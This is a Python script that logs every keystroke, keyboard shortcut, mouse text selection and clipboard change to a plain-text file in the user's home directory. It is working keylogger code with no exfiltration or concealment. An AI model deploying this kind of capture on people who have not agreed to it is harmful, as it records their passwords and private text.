import os
import time
import threading
from datetime import datetime
from pynput import keyboard, mouse
import pyperclip
from collections import deque

# Setup log file path
log_dir = os.path.expanduser("~/log")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "desktop.log")

# Rolling log using deque with 1,000,000 line limit
log_deque = deque(maxlen=1_000_000)
log_lock = threading.Lock()

# Logging function with timestamp (adds new log to top)
def log_event(event):
    timestamped_event = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {event}"
    with log_lock:
        log_deque.appendleft(timestamped_event)
        with open(log_file, 'w') as f:
            f.write('\n'.join(log_deque))

# Clipboard monitoring
last_clipboard = ""

def monitor_clipboard():
    global last_clipboard
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clipboard:
                last_clipboard = clip
                log_event(f"Clipboard Changed: {repr(clip)}")
        except Exception as e:
            log_event(f"Clipboard Error: {e}")
        time.sleep(2)

# Track keys pressed for combos
pressed_keys = set()

def on_press(key):
    pressed_keys.add(key)
    try:
        # Detect common shortcut combos
        if keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys:
            if key == keyboard.KeyCode.from_char('c'):
                log_event("Shortcut: Ctrl+C")
            elif key == keyboard.KeyCode.from_char('v'):
                log_event("Shortcut: Ctrl+V")
            elif key == keyboard.KeyCode.from_char('x'):
                log_event("Shortcut: Ctrl+X")
            elif key == keyboard.KeyCode.from_char('z'):
                if keyboard.Key.shift in pressed_keys:
                    log_event("Shortcut: Ctrl+Shift+Z")
                else:
                    log_event("Shortcut: Ctrl+Z")

        if hasattr(key, 'char') and key.char:
            log_event(f"Key Pressed: {key.char}")
        else:
            log_event(f"Special Key: {key}")
    except Exception as e:
        log_event(f"Key Press Error: {e}")

def on_release(key):
    pressed_keys.discard(key)

# Mouse selection tracking
selecting = False
start_pos = None

def on_click(x, y, button, pressed):
    global selecting, start_pos
    if button == mouse.Button.left:
        if pressed:
            selecting = True
            start_pos = (x, y)
        else:
            if selecting:
                log_event(f"Mouse Text Selection: start={start_pos}, end=({x}, {y})")
                selecting = False

# Start clipboard monitor thread
threading.Thread(target=monitor_clipboard, daemon=True).start()

# Start keyboard and mouse listeners
keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
